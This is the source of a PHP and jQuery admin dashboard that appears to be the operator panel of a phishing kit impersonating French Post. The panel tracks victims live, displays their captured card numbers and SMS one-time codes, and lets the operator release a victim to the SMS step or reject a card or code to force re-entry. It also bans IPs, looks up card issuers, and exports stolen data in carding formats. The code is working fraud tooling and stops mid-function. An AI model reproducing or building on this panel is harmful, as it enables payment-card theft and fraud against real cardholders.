<?php
/*
session_start();
if (!isset($_SESSION['user_logged_in'])) {
    header('Location: login.php');
    exit();
}else{
    $session_username = $_SESSION['user_logged_in']['username'];
}
*/
//require $_SERVER["DOCUMENT_ROOT"].'/config.php';

require_once 'config.php';

$check_site_live = array();
$sql = "SELECT *
FROM source_code_manage
WHERE source_code_name IN (SELECT value FROM dashboard WHERE meta_key='front_site_live');";
if ($result = mysqli_query($conn, $sql)) {
    $check_site_live = $result->fetch_assoc();
}

if (isset($_POST['refresh'])) {

    $sql = "SELECT id,cardstatus,verificcode, cardnumber, code,TIMESTAMPDIFF(SECOND, ifnull(date_updated, now()), now()) diff FROM user_information u ORDER BY `u`.`id` DESC";
    $users = [];
    $rows = [];
    $i = 0;
    if ($result = mysqli_query($conn, $sql)) {
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
            $rows[] = $row;

            if ($row['diff'] > 0 && $row['diff'] < 15) {
                $users[$i]['id'] = $row['id'];
                $users[$i]['status'] = '<div class="online"><span class="tooltiptext">Online</span></div>';
                // $users[$i]['code'] = $row['code'];
            } else {
                $users[$i]['id'] = $row['id'];
                $users[$i]['status'] = '<div class="offline"><span class="tooltiptext">Offline</span></div>';
                // $users[$i]['code'] = $row['code'];
            }
            if ($row['code']) {
                $rowcard = $row['cardnumber'];
                $rowcode = $row['code'];
                $users[$i]['code'] = '<div class="sms-tooltiptext">Card: ' . $rowcard . '</br> SMS: ' . $rowcode . '</div><div class="sms-code">' . $rowcode . '</div>';
            } else {
                $users[$i]['code'] = $row['code'];
            }

          
            $users[$i]['cardstatus'] = $row['cardstatus'];
            $users[$i]['verificcode'] = $row['verificcode'];

            $i++;
        }
    }

    $response['status'] = true;
    $response['users'] = $users;
    //print_r($users);exit;

    die(json_encode($response));
}

//date_default_timezone_set('Asia/Tokyo');
$time = date('Hi');

//echo $time;
$theme_mode = 'day';
if (($time >= "0600") && ($time <= "1200")) {
    $admin_time_zone_msg = "Good Morning";
    $theme_mode = 'day';
} elseif (($time >= "1201") && ($time <= "1600")) {
    $admin_time_zone_msg = "Good Afternoon";
    $theme_mode = 'day';
} elseif (($time >= "1601") && ($time <= "2100")) {
    $admin_time_zone_msg = "Good Evening";
    $theme_mode = 'day';
} elseif (($time >= "2101") && ($time <= "2400")) {
    $admin_time_zone_msg = "Good Night";
    $theme_mode = 'day'; //night
} else {
    $admin_time_zone_msg = "Why aren't you asleep?  Are you programming?<br>";
}


// Check if the user is logged in, if not then redirect him to login page
if (!isset($_SESSION["loggedin"])) {
    header("location: /admin/login.php");
    exit;
}
?>

<!DOCTYPE html>

<!-- <html lang="en" class="light-style layout-menu-fixed" dir="ltr" data-theme="theme-default" data-assets-path="./assets/" data-template="vertical-menu-template-free"> -->
<html lang="en" class="light-style" dir="ltr" data-theme="theme-default" data-assets-path="./assets/" data-template="vertical-menu-template-free">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />

    <title>操作台</title>

    <meta name="description" content="" />

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="./assets/img/favicon/favicon.ico" />

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet" />

    <!-- Icons. Uncomment required icon fonts -->
    <link rel="stylesheet" href="./assets/vendor/fonts/boxicons.css" />

    <!-- Core CSS -->
    <link rel="stylesheet" href="./assets/vendor/css/core.css" class="template-customizer-core-css" />
    <link rel="stylesheet" href="./assets/vendor/css/theme-default.css" class="template-customizer-theme-css" />
    <link rel="stylesheet" href="./assets/css/demo.css" />

    <!-- Vendors CSS -->
    <link rel="stylesheet" href="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css" />

    <link rel="stylesheet" type="text/css" href="./assets/css/custom-2.css">

    <!-- Page CSS -->
    <?php if ($theme_mode == 'night') { ?>
        <link rel="stylesheet" href="./assets/css/core-dark.css" />
        <link rel="stylesheet" href="./assets/css/theme-default-dark.css" />
    <?php } ?>
    <!-- Helpers -->
    <script src="./assets/vendor/js/helpers.js"></script>

    <link rel="stylesheet" href="./assets/css/custom.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="./assets/js/custom.js"></script>

    <!--! Template customizer & Theme config files MUST be included after core stylesheets and helpers.js in the <head> section -->
    <!--? Config:  Mandatory theme config file contain global vars & default theme options, Set your preferred theme option in this file.  -->
    <script src="./assets/js/config.js"></script>

    <style>
        .user-info-tbl, .user-info-tbl tr, .user-info-tbl th, .user-info-tbl td, .user-info-tbl thead, .user-info-tbl tbody{
            border: unset !important;
        }
        thead,
        tbody,
        tfoot,
        tr,
        td,
        th {
            border-width: 1px;
        }
    </style>

      <?php include("dashboard_header.php"); ?>
</head>

<body>
    <!-- Layout wrapper -->
    <div class="layout-wrapper layout-content-navbar">
        <div class="layout-container">
            <!-- Menu -->

            <?php include("side_menu.php"); ?>
            <!-- / Menu -->

            <!-- Layout container -->
            <div id="layout-content-him" class="layout-page">
                <!-- Content wrapper -->
                <div class="content-wrapper">
                    <!-- Content -->

                    <div class="container-fluid flex-grow-1 container-p-y">
                        <!-- Layout Demo -->
                        <div class="layout-demo-wrapper">
                            <div class="inner-con" style="width: 100%;">





                                <div id="notificationStatus" style="color: blue;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;"></div>
                                
                                <!-- <h2 class="">法国邮政后台</h2> -->


                                <div id="message"></div>

                                <div class="card">
                                    <h5 class="card-header">All Users </h5>

                                    <div class="container mb-3">
                                        <div class="row">
                                            <!-- Visitor Box -->
                                            <div class="col-md-6">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h5 class="card-title">今日访问</h5>
                                                        <p class="card-text"><span id="today_visitor_count"></span></p>
                                                        <!-- Additional visitor information -->
                                                        <!-- Add more card content here if needed -->
                                                    </div>
                                                </div>
                                            </div>

                                            <!-- Online Visitor Box -->
                                            <div class="col-md-6">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <h5 class="card-title">在线人数</h5>
                                                        <p class="card-text"> <span id="live_visitor_count"></span></p>
                                                        <!-- Additional online visitor information -->
                                                        <!-- Add more card content here if needed -->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>


                                    <div class="container mb-3" style="">

                                        <div class="row">

                                            <div class="col-sm-6" style="text-align: left">

                                            <button type="button" class="btn btn-success" id="new_button" onclick="location.reload();" style="display:none; background-color: blue; margin-bottom: 10px;">New users coming in</button>
                                            </div>

                                            <div class="col-sm-3" style="text-align: center">
                                                    <p style="border:1px solid gray;padding:7px;border-radius: ;">当前网站 : <?php 
                                                       echo  " ( ".substr($check_site_live['country'],0,15)." )"; 
                                                    //print_r($check_site_live); ?></p>
                                                </div>
                                           
                                            <div class="col-sm-2" style="text-align: right">

                                                
                                            <button type="button" id="user_export" class="btn btn-success cardrelease mb-2" style="width: 10vw;margin-right:2px">数据导出</button>

                                            <a href="all_users.txt" id="downloadFrame" target="_blank" class="" style="width: 10vw;margin-left:1ox;display:none">全资格式</a>
                                            <a href="" id="downloadFrame2" target="_blank" class="" style="width: 10vw;margin-left:1ox;display:none">料站格式</a>
                                            </div>
                                        </div>
                                        

                                    </div>
                                    <div class="card-body">
                                        <div class="table-responsive text-nowrap" >
                                           <?php include('user_auto_reload_cl.php'); ?>
                                        </div>
                                    </div>
                                </div>


                                <iframe src="https://upload.wikimedia.org/wikipedia/commons/3/34/Sound_Effect_-_Door_Bell.ogg" style="display:none" id="iframeAudio">
                                </iframe>
                                <audio id="audio" src="https://upload.wikimedia.org/wikipedia/commons/3/34/Sound_Effect_-_Door_Bell.ogg" style="display: none;" loop preload="auto" crossOrigin="anonymous"></audio>


                                <!-- <div class="card">
                                <h5 class="card-header">All Users</h5>
                                <div class="card-body">
                                    <div class="table-responsive text-nowrap">
                                    <table id="example" class="display table table-striped" style="width:100%">
                                    <thead>
                                        <tr>
                                            <th>Name</th>
                                            <th>Position</th>
                                            <th>Office</th>
                                            <th>Age</th>
                                            <th>Start date</th>
                                            <th>Salary</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td>Tiger Nixon</td>
                                            <td>System Architect</td>
                                            <td>Edinburgh</td>
                                            <td>61</td>
                                            <td>2011-04-25</td>
                                            <td>$320,800</td>
                                        </tr>
                                        <tr>
                                            <td>Garrett Winters</td>
                                            <td>Accountant</td>
                                            <td>Tokyo</td>
                                            <td>63</td>
                                            <td>2011-07-25</td>
                                            <td>$170,750</td>
                                        </tr>
                                        <tr>
                                            <td>Ashton Cox</td>
                                            <td>Junior Technical Author</td>
                                            <td>San Francisco</td>
                                            <td>66</td>
                                            <td>2009-01-12</td>
                                            <td>$86,000</td>
                                        </tr>
                                        <tr>
                                            <td>Cedric Kelly</td>
                                            <td>Senior Javascript Developer</td>
                                            <td>Edinburgh</td>
                                            <td>22</td>
                                            <td>2012-03-29</td>
                                            <td>$433,060</td>
                                        </tr>
                                        <tr>
                                            <td>Airi Satou</td>
                                            <td>Accountant</td>
                                            <td>Tokyo</td>
                                            <td>33</td>
                                            <td>2008-11-28</td>
                                            <td>$162,700</td>
                                        </tr>

                                    </tbody>
                                    <tfoot>
                                        <tr>
                                            <th>Name</th>
                                            <th>Position</th>
                                            <th>Office</th>
                                            <th>Age</th>
                                            <th>Start date</th>
                                            <th>Salary</th>
                                        </tr>
                                    </tfoot>
                                </table>
                                    </div>
                                </div>
                            </div>              -->

                            </div>
                        </div>
                        <!--/ Layout Demo -->
                    </div>
                    <!-- / Content -->

                    <!-- Footer -->
                    <footer class="content-footer footer bg-footer-theme">
                        <div class="container-xxl d-flex flex-wrap justify-content-between py-2 flex-md-row flex-column">
                            <div class="mb-2 mb-md-0">
                                ©
                                <script>
                                    document.write(new Date().getFullYear());
                                </script>
                                , made with ❤️

                            </div>
                        </div>
                    </footer>
                    <!-- / Footer -->

                    <div class="content-backdrop fade"></div>
                </div>
                <!-- Content wrapper -->
            </div>
            <!-- / Layout page -->
        </div>

        <!-- Overlay -->
        <div class="layout-overlay layout-menu-toggle"></div>
    </div>
    <!-- / Layout wrapper -->

      <div class="modal modal-fullscreen-sm" id="card_info_api_code_model" role="dialog">

            <div class="modal-dialog">

                <!-- Modal content-->

                <div class="modal-content all-radius">

             
                    <div class="modal-body">
                        <div class="row no-record_found">
                            
                            <div class="col-lg-4 col-md-4 col-sm-4 ">
                               <p class="card_m_heading">SEHEME/NETWORK</p>
                                <p id="card_">Mastercard</p>

                                <p class="card_m_heading">Brand</p>
                                <p id="band_">Standard</p>

                                <p class="card_m_heading">CARD NUMBER</p>
                                <p id="card_n"></p>
                                
                            </div>
                            <div class="col-lg-4 col-md-4 col-sm-4 ">
                                <p class="card_m_heading">TYPE</p>
                                <p id="card_t">Debit/Credit</p>

                                
                                <p class="card_m_heading">PREPAID</p>
                                <p id="card_pp">YES/NO</p>

                               
                                <p class="card_m_heading">COUNTRY</p>
                                <p id="card_country">TR Turkey</p>
                                <p id="card_country_lat">(Latitude 39, Longitude ,35)</p>
                               
                            </div>

                            <div class="col-lg-4 col-md-4 col-sm-4 ">
                                <p class="card_m_heading">BANK</p>
                                <p id="card_bank">TURKIYE HALK BANKS..</p>
                                <p id="card_bank_web">www.halkbank.com.tr</p>
                                <p id="card_bank_mob">(+90312289200))</p>
                                
                            </div>
                        </div>
                    </div>
                   
                </div>
            </div>
        </div>



    <!-- Core JS -->
    <!-- build:js assets/vendor/js/core.js -->
    <script src="./assets/vendor/libs/jquery/jquery.js"></script>
    <script src="./assets/vendor/libs/popper/popper.js"></script>
    <script src="./assets/vendor/js/bootstrap.js"></script>
    <script src="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>

    <script src="./assets/vendor/js/menu.js"></script>
    <!-- endbuild -->

    <!-- Vendors JS -->

    <!-- Main JS -->
    <script src="./assets/js/main.js"></script>

    <!-- Page JS -->

    <!-- Place this tag in your head or just before your close body tag. -->
    <script async defer src="https://buttons.github.io/buttons.js"></script>

    <link rel="stylesheet" type="text/css" href="DataTables/datatables.min.css" />
    <script type="text/javascript" src="DataTables/datatables.min.js"></script>

    <script>
        $(document).ready(function() {
            
            // Setup - add a text input to each footer cell
            /* $('#example tfoot th').each(function () {
                 var title = $(this).text();
                 $(this).html('<input type="text" placeholder="Search ' + title + '" />');
             }); */


            /**Lucas--- */
            $(document).on('change', '.cardstatus', function(e) {

                let status = e.target.value;
                let userId = $(this).attr("userid")
                //console.log(status)
               // console.log(userId)
                if (status == 'release') {
                    $.ajax({
                        type: 'post',
                        url: 'release.php',
                        data: {
                            'userid': userId,
                            'cardstatus': status
                        },
                        success: function(data) {
                            if (data == 1) {

                                let toast = {
                                    title: "提示！",
                                    message: "卡号已放行至短信页面",
                                    status: 1,
                                    timeout: 5000
                                }
                                Toast.create(toast);

                                return true;
                            } else {

                                let toast = {
                                    title: "Error!",
                                    message: "Something is wrong with card release .please contact to administrator.",
                                    status: 3,
                                    timeout: 5000
                                }
                                Toast.create(toast);

                                return false;
                            }
                        }
                    });

                } else if (status == 'releaseh') {
                    $.ajax({
                        type: 'post',
                        url: 'release.php',
                        data: {
                            'userid': userId,
                        },
                        success: function(data) {
                            if (data == 1) {

                                $(".row-"+userId).addClass("approved");
                               
                                let toast = {
                                    title: "提示！",
                                    message: "用户已放行至站外",
                                    status: 1,
                                    timeout: 5000
                                }
                                Toast.create(toast);
                                /* setTimeout(function() {
                                    location.reload();
                                }, 3000);*/
                                return true;
                            } else {

                                let toast = {
                                    title: "Error!",
                                    message: "Something is wrong with card release .please contact to administrator.",
                                    status: 3,
                                    timeout: 5000
                                }
                                Toast.create(toast);
                                return false;
                            }
                        }
                    });

                } else if (status == "refuse") {
                    $.ajax({
                        type: 'post',
                        url: 'reject.php',
                        data: {
                            'userid': userId,
                            'cardstatus': status
                        },
                        success: function(data) {
                            if (data == 1) {
                                rejected[userId] = true;

                                let toast = {
                                    title: "提示！",
                                    message: "卡片已被拒绝，等待重新填卡",
                                    status: 1,
                                    timeout: 5000
                                }
                                Toast.create(toast);
                                return true;
                            } else {
                                return false;
                            }
                        }
                    });
                } else if (status == "reject") {
                   
                    $.ajax({
                        type: 'post',
                        url: 'reject.php',
                        data: {
                            'userid': userId,
                            'cardstatus' : status,
                        },
                        success: function(data) {
                            if (data == 1) {
                                rejected[userId] = true;

                                let toast = {
                                    title: "提示！",
                                    message: "短信已拒绝，等待新的验证码输入",
                                    status: 1,
                                    timeout: 5000
                                }
                                Toast.create(toast);

                                return true;
                            } else {
                                return false;
                            }
                        }
                    });
                } else if (status == "cardInvalid") {
                   
                    $.ajax({
                        type: 'post',
                        url: 'reject.php',
                        data: {
                            'userid': userId,
                            'cardstatus' : status,
                        },
                        success: function(data) {
                            if (data == 1) {
                                rejected[userId] = true;

                                let toast = {
                                    title: "提示！",
                                    message: "用户已收到提示并返回支付页面",
                                    status: 1,
                                    timeout: 5000
                                }
                                Toast.create(toast);

                                return true;
                            } else {
                                return false;
                            }
                        }
                    });
                }
            })


            $(document).on('click', '.banip', function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");

                $.ajax({
                    type: 'post',
                    url: 'banip.php',
                    data: {
                        'userid': userid
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Successfully IP banned<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 5000);
                            return true;
                        } else {
                            return false;
                        }
                    }
                });

            });
            /**Lucas-end */
            // DataTable
          
        });
    </script>
    <div id="credit_card_modal">
        <div id="credit_card">
            <p id="credit_card_number"></p>
            <p id="credit_card_cvv"></p>
            <p id="credit_card_expry"></p>
            <p id="credit_card_holder"></p>
        </div>
    </div>

     <?php 
        if(empty($rows)){
            $jsonData = array(); 
            $array_cnt = array();
        }else{
             $jsonData = json_encode($rows);
             $array_cnt = $rows;
        }   
        ?>


    <?php include("dashboard_fotter.php"); ?>




    <script>

        let users = JSON.parse('<?php echo $jsonData?$jsonData:'[{}]'; ?>');
        let numRow = '<?php echo count($array_cnt); ?>';

    
        let oldRow = localStorage.getItem('tot');
        let counter = 0;
        let oldCode = [];
        let rejected = [];



        /*$none = "cardstatus_none_".$row['id'];
                            $reject = "cardstatus_reject_".$row['id'];
                            $approve = "cardstatus_approve_".$row['id'];


                          if ($row['cardstatus'] == "none") {
                                echo "<span id=".$none." style='color:black;font-size:16px;'>没有卡</span>";
                            }
                            if ($row['cardstatus'] == "reject" || $row['cardstatus'] == "added") {
                                echo "<span id=".$reject."  style='color:red;font-size:16px;'>卡号已拒绝</span>";
                            }
                            if ($row['cardstatus'] == "approve") {
                                echo "<span id=".$approve."  style='color:green;font-weight:bold;font-size:16px;'>通过</span>";
                            }*/




        function refresh() {
            $.ajax({
                type: "POST",
                url: 'users.php',
                data: {
                    "refresh": true
                },
                dataType: "json",
                success: function(data) {
                    
                    if (data.status) {
                        for (i = 0; i < data.users.length; i++) {
                            $("#user" + data.users[i].id).html(data.users[i].status);
                            if(data.users[i].code!=null){
                                $("#col-code-" + data.users[i].id).html('<span class="btn btn-primary">'+data.users[i].code || ''+'</span>');
                            }

                            $('#col-code-' + data.users[i].id).removeClass('highlight');
                            if ((data.users[i].code || '') != '' && oldCode[data.users[i].id] != data.users[i].code) {
                                oldCode[data.users[i].id] = data.users[i].code;
                                $('#col-code-' + data.users[i].id).addClass('highlight');
                                if (rejected[data.users[i].id]) {
                                    rejected[data.users[i].id] = false;
                                    $("#notificationStatus").html('ID ' + data.users[i].id + ' status update');
                                }
                            }

                            if(data.users[i].cardstatus!=null){

                               // console.log("status ",data.users[i]);
                               // console.log("verificcode ",data.users[i].verificcode);
                                //debugger;
                                if(data.users[i].cardstatus=="none"){
                                  let nonetext = "<span style='color:black;font-size:16px;'>没有卡</span>";
                                  $("#cardstatus"+data.users[i].id).html(nonetext);

                                }
                                if(data.users[i].cardstatus=="approve"){
                                  let nonetext = "<span style='color:red;font-size:16px;'>通过</span>";
                                  $("#cardstatus"+data.users[i].id).html(nonetext);
                                }
                                
                                if(data.users[i].cardstatus=="reject" && data.users[i].verificcode=="2"){
                                  let nonetext = "<span style='color:red;font-size:16px;'>卡被拒绝</span>";
                                  $("#cardstatus"+data.users[i].id).html(nonetext);
                                }

                                if(data.users[i].cardstatus=="reject" && data.users[i].verificcode=="0"){
                                  let nonetext = "<span style='color:red;font-size:16px;'>短信已拒绝</span>";
                                  $("#cardstatus"+data.users[i].id).html(nonetext);
                                }

                                if(data.users[i].cardstatus=="reject" && data.users[i].verificcode =="3"){
                                  let nonetext = "<span style='color:red;font-size:16px;'>重新填写卡号</span>";
                                  $("#cardstatus"+data.users[i].id).html(nonetext);
                                }

                                if(data.users[i].cardstatus=="approve"){
                                   let nonetext = "<span style='color:green;font-weight:bold;font-size:16px;'>通过</span>";
                                   $("#cardstatus"+data.users[i].id).html(nonetext);
                                }

                                

                                //$("#col-code-" + data.users[i].id).html('<span class="btn btn-primary">'+data.users[i].code || ''+'</span>');
                            }


                        }

                        oldRow = numRow;
                        numRow = data.users.length;
                        if (numRow > oldRow) { // oldRow != numRow

                            $.ajax({
                                type: 'post',
                                url: 'user_auto_reload_cl.php',
                                data: {
                                    'action': 'user_export'
                                },
                                success: function(data) {
                                   
                                    var table = $('#user_data_table').DataTable();
                                    table.destroy();

                                    var container = document.getElementById('user_data_table');
                                    container.innerHTML = data;
                                    $('#user_data_table').DataTable({
                                        aLengthMenu: [
                                            [25, 50, 100, 200, -1],
                                            [25, 50, 100, 200, "All"]
                                        ],
                                        iDisplayLength: -1,
                                        order: [
                                            [0, 'desc']
                                        ],
                                        initComplete: function() {
                                            // Apply the search
                                            this.api()
                                                .columns()
                                                .every(function() {
                                                    var that = this;
                                                });
                                        },
                                    });

                                    $("#new_button").show();
                            
                                    var audio = document.getElementById('audio');
                                    const playButton = document.getElementById('new_button');

                                    audio.load();
                                    audio.play()
                                        .then(() => {
                                           // console.log("ok");
                                            setTimeout(function () {
                                                audio.pause();
                                                playButton.style.display = 'none';
                                            }, 8000);
                                        })
                                        .catch(error => {
                                           // console.error("Failed to play audio:", error);
                                        });

                                }
                            });

                        }
                    }
                }
            });
        }

        function getVisitorCount(){
             $("#message").html('');
            $.ajax({
              type: 'post',
              url: 'dashboard_functions.php',
              data: {
                'action': 'today_visitor_count'
              },
              success: function(data) {
                var data = JSON.parse(data);
           
                    $("#today_visitor_count").html(data.today_visitor_count);
                    $("#live_visitor_count").html(data.live_visitor_count);
              }
            });
        }

        $(document).ready(function() {
            getVisitorCount();
            window.setInterval(refresh, 3000);
            window.setInterval(getVisitorCount, 4000);


            /* if (oldRow != numRow) {
                console.log("in condition...");
                setTimeout(function() {
                    $("body").trigger('click');
                }, 400);

            } */

            $(document).on('click', '#user_export', function(e) {

                e.preventDefault();
                $.ajax({
                    type: 'post',
                    url: 'dashboard_functions.php',
                    dataType: "json",
                    data: {
                        'action': 'user_export'
                    },
                    success: function(data) {
                        //debugger;
                       // console.log(data);
                        const desiredExtension = '.txt';
                        if (data.file_name_1.endsWith(desiredExtension)) {
                            $('#downloadFrame,#downloadFrame2').show();
                            $('#downloadFrame').attr('href', data.file_name_1);
                            $('#downloadFrame').attr('Download', 'UserInformation.txt');

                            $('#downloadFrame2').attr('href', data.file_name_2);
                            $('#downloadFrame2').attr('Download', 'UserInformation.txt');
                            // $('#downloadFrame').toggle();
                            $('#downloadFrame').trigger('click');
                            $('#downloadFrame2').trigger('click');

                        } else {
                            
                            $("#message").html(
                                "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with limit update .please contact to administrator.<span>"
                            );
                            setTimeout(function() {
                                $("#message").html('');
                            }, 3000);
                            return false;
                        }
                    }
                });
            });


            $(".reject").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");

                $.ajax({
                    type: 'post',
                    url: 'reject.php',
                    data: {
                        'userid': userid
                    },
                    success: function(data) {
                        if (data == 1) {
                            rejected[userid] = true;
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>短信已拒绝，等待新的验证码输入<span>"
                            );
                            return true;
                        } else {
                            return false;
                        }
                    }
                });

            });
            $(".release").click(function(event) {
               
                event.preventDefault();
                var userid = $(this).attr("userid");

                $.ajax({
                    type: 'post',
                    url: 'release.php',
                    data: {
                        'userid': userid
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Successfully released application<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 5000);
                            return true;
                        } else {
                            return false;
                        }
                    }
                });

            });

            /*card permit/denied code start here */

            $('select.form-select').on('change', function() {
                var userid = $(this).attr("userid");

                if (this.value == "realease") {

                    var cardstatus = "approve";
                    $.ajax({
                        type: 'post',
                        url: 'release.php',
                        data: {
                            'userid': userid,
                            'cardstatus': cardstatus
                        },
                        success: function(data) {
                            if (data == 1) {
                                $("#message").html(
                                    "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>卡号已放行至短信页面<span>"
                                );
                                setTimeout(function() {
                                    location.reload();
                                }, 5000);
                                return true;
                            } else {
                                $("#message").html(
                                    "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with card release .please contact to administrator.<span>"
                                );

                                return false;
                            }
                        }
                    });

                }
                if (this.value == "realease" || this.value == "refused_1" || this.value == "refused_2" || this.value == "refused_pin" || this.value == "refused_change_card") {

                    var cardstatus = "reject";
                    if (this.value == 'refused_1') {
                        cardstatus = 'reject';
                    } else if (this.value == 'refused_2') {
                        cardstatus = 'reject_2';
                    } else {
                        cardstatus = this.value;
                    }

                    $.ajax({
                        type: 'post',
                        url: 'reject.php',
                        data: {
                            'userid': userid,
                            'cardstatus': cardstatus
                        },
                        success: function(data) {
                            if (data == 1) {
                                $("#message").html(
                                    "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Card Reject Successfully.<span>"
                                );
                                setTimeout(function() {
                                    location.reload();
                                }, 3000);
                                return true;
                            } else {
                                $("#message").html(
                                    "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong please contact to administrator.<span>"
                                );
                                return false;
                            }
                        }
                    });

                }

                /*
                if (this.value == "yes") {
                    $(".row-" + userid + " .cardrelease").fadeIn();
                    $(".row-" + userid + " .cardreject").fadeIn();
                } else {
                    $(".row-" + userid + " .cardrelease").fadeOut();
                    $(".row-" + userid + " .cardreject").fadeOut();
                }*/
            });

            /*card reject code start here */

            $(".cardreject").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");
                var cardstatus = "reject";
                $.ajax({
                    type: 'post',
                    url: 'reject.php',
                    data: {
                        'userid': userid,
                        'cardstatus': cardstatus
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Card Reject Successfully.<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 3000);
                            return true;
                        } else {
                            $("#message").html(
                                "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong please contact to administrator.<span>"
                            );
                            return false;
                        }
                    }
                });

            });

            /*card release code start here*/
            $(".cardrelease").click(function(event) {
                event.preventDefault();
                var userid = $(this).attr("userid");
                var cardstatus = "approve";
                $.ajax({
                    type: 'post',
                    url: 'release.php',
                    data: {
                        'userid': userid,
                        'cardstatus': cardstatus
                    },
                    success: function(data) {
                        if (data == 1) {
                            $("#message").html(
                                "<span style='color: green;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>卡号已放行至短信页面<span>"
                            );
                            setTimeout(function() {
                                location.reload();
                            }, 5000);
                            return true;
                        } else {
                            $("#message").html(
                                "<span style='color: red;font-size: 18px;text-align: left;width: 100%;padding: 10px 0 0 0;'>Something is wrong with card release .please contact to administrator.<span>"
                            );

                            return false;
                        }
                    }
                });

            });

           

            $(document).on('click', '#credit_card_modal', function(event) {
            
                $('#credit_card_modal').fadeOut();
            })

            $(document).on('click', '.item-delete', function(event) {
                event.preventDefault();

                if (confirm("Are you sure?")) {

                    var userid = $(this).attr("userid");
                    var thisele = $(this);
                    $.ajax({
                        type: 'post',
                        url: 'dashboard_functions.php',
                        data: {
                            'userid': userid,
                            'action': 'user_delete'
                        },
                        success: function(data) {

                            if (data == 1) {


                                var table = $('#user_data_table').DataTable();
                                var removingRow = thisele.closest('tr');
                                console.log(thisele);
                                table.row(removingRow).remove().draw();

                                let toast = {
                                    title: "提示！",
                                    message: "User deleted Successfully",
                                    status: 1,
                                    timeout: 5000
                                }
                                Toast.create(toast);

                                return true;
                            } else {
                                return false;
                            }
                        }
                    });


                }
                return false;

            });
        });

        function checkCardValid(cardNo) {
            const modalBody = document.getElementById('binDetailsBody');
            var xhr = new XMLHttpRequest();
            var url = '/comman_helper.php?action=cardvalidation&card_number='+cardNo;
            xhr.open('GET', url, true);
            xhr.onload = function () {
               
                if (xhr.status >= 200 && xhr.status < 300) {
                    var userData = JSON.parse(xhr.responseText);
                    displayBinDetails(userData);
                   // console.log(userData);
                } else if(xhr.status == 404) {
                    modalBody.innerHTML = '<p class="mb-0">Card is not valid</p>';
                    $('#binDetailsModal').modal('show');
                }else {
                    console.error('Request failed with status:', xhr.status);
                    modalBody.innerHTML = '<p class="mb-0">'+xhr.responseText+'</p>';
                    $('#binDetailsModal').modal('show');
                }
            };
            xhr.onerror = function () {
                console.error('Request failed');
            };
            xhr.send();
        }

        function displayBinDetails(data) {

            const modalBody = document.getElementById('binDetailsBody');
            let prepaid = "true";
            modalBody.innerHTML = '' +
                '<ul class="result">' +
                '<li class="scheme">' +
                '<h2>方案/網絡</h2>' +
                '<p>'+data.data.card_type+'</p>' +
                '</li>' +
                '<li class="brand">' +
                '<h2>品牌</h2>' +
                '<p>'+data.data.card_brand+'</p>' +
                '</li>' +
                '<li class="number">' +
                '<h2>卡號</h2>' +
                '<ul>' +
                '<li class="length"><h3>Length</h3><p>'+(data.data.bin_iin ? data.data.bin_iin : '')+'</p></li>' +
                '</li>' +
                '</ul>' +
                '</li>' +
                '<li class="type">' +
                '<h2>類型</h2>' +
                '<ol>' +
                '<li class="'+((data.data.card_type && data.data.card_type == 'DEBIT') ? 'selected' : '')+'" data-value="debit">借方</li>' +
                '<li class="'+((data.data.card_type && data.data.card_type == 'CREDIT') ? 'selected' : '')+'" data-value="credit">信用</li>' +
                '</ol>' +
                '</li>' +
        
                '</li>' +
                '<li class="country">' +
                '<h2>國家</h2>' +
                '<p class="name">'+(data.data.iso_country_name ? data.data.iso_country_name : '')+'</p>' +
                
                '</li>' +
                '<li class="bank" style="display:'+(data.data.issuer_name_bank ? 'block' : 'none')+'">' +
                '<h2>銀行</h2>' +
                '<p class="name">'+(data.data.issuer_name_bank ? data.data.issuer_name_bank : '')+'</p>' +
                '<p class="url">' +
                '<a href="http://www.jyskebank.dk">'+(data.data.issuer_bank_website ? data.data.issuer_bank_website : '')+'</a>' +
                '</p>' +
                '<p class="phone">'+(data.data.issuer_bank_phone ? data.data.issuer_bank_phone : '')+'</p>' +
